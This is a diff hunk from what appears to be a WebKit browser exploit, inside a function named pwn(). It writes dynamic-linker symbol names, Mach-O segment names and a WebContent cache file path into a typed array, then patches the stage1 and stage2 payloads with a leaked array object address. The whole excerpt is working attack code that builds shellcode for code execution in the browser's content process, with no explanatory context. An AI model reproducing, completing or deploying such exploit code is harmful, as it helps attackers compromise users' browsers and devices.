@@ -405,8 +405,10 @@ function pwn() {
     writeStringToUint8Array("_write", ourArray, stringsOff + 79);
     writeStringToUint8Array("_dup2", ourArray, stringsOff + 86);
     writeStringToUint8Array("_dlopen", ourArray, stringsOff + 92);
-    writeStringToUint8Array("HOME", ourArray, stringsOff + 100);
-    writeStringToUint8Array("/Library/Caches/com.apple.WebKit.WebContent/log.txt", ourArray, stringsOff + 105);
+    writeStringToUint8Array("__TEXT", ourArray, stringsOff + 100);
+    writeStringToUint8Array("__LINKEDIT", ourArray, stringsOff + 107);
+    writeStringToUint8Array("HOME", ourArray, stringsOff + 118);
+    writeStringToUint8Array("/Library/Caches/com.apple.WebKit.WebContent/ABCD.txt", ourArray, stringsOff + 123);
     
     stage1.replace(new Int64("0xbadbad10badbad10"), new Int64(arrayObjectAddr));
     stage2.replace(new Int64("0xbadbad10badbad10"), new Int64(arrayObjectAddr));
